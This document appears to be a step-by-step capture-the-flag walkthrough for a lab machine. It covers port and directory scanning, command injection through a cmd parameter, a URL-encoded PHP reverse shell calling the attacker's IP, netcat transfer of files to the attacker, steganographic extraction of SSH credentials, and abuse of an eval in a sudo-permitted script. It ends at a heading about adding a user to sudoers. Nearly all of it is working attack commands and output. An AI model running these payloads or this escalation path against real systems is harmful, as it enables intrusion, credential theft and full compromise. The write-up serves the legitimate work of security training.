# NMAP
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# DIRB
==> DIRECTORY: http://10.10.254.124:80/assets/
+ http://10.10.254.124:80/index.html (CODE:200|SIZE:1988)                   
+ http://10.10.254.124:80/server-status (CODE:403|SIZE:278)                 
                                                                            
---- Entering directory: http://10.10.254.124:80/assets/ ----
                                                                                                                            ==> DIRECTORY: http://10.10.254.124:80/assets/images/
+ http://10.10.254.124:80/assets/index.php (CODE:200|SIZE:0)                
                                                                            
---- Entering directory: http://10.10.254.124:80/assets/images/ ----
none                                                                                                         

# COMMAND INJECTION ON /assets/index.php
(find directories) -> /assets/index.php?cmd=ls
aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==

## echo 'aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==' | base64 -d
images
index.php
styles.css

# REVERSE SHELL with netcat
nc -lvnp 4444

(generated with https://www.revshells.com/)
http://10.10.247.114/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.21.217.122%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

-> ls
images
index.php
styles.css
-> cd images
-> ls
oneforall.jpg
yuei.jpg

# TRANSFERRED jpg FILES with netcat
## on attacker machine (before)
nc -lvnp 3344 > oneforall.jpg 
nc -lvnp 3344 > yuei.jpg 

## on server (sender) (after)
nc 10.21.217.122 3344 < oneforall.jpg
nc 10.21.217.122 3344 < yuei.jpg


# MAGICBYTES
To fix the format of the files

# STEGANOGRAPHY
-> steghide extract -sf yuei.jpg
Enter passphrase: ???

# ENUM THE WEB SERVER TO FIND THE PASSWORD
Found passphrase.txt
AllmightForEver!!!

# STEGANOGRAPHY
-> steghide extract -sf oneforall.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".

-> cat creds.txt
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A

Found ssh creds

# CONNECT TO SSH
-> ssh deku@10.10.247.114

# CHECK what SUDO CAPABILITIES doku have
-> sudo -l 
User deku may run the following commands on ip-10-10-247-114:
    (ALL) /opt/NewComponent/feedback.sh

## check feedback.sh
then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi

the bash file execute the feedback message, so...

# ADD USER TO SUDOERS
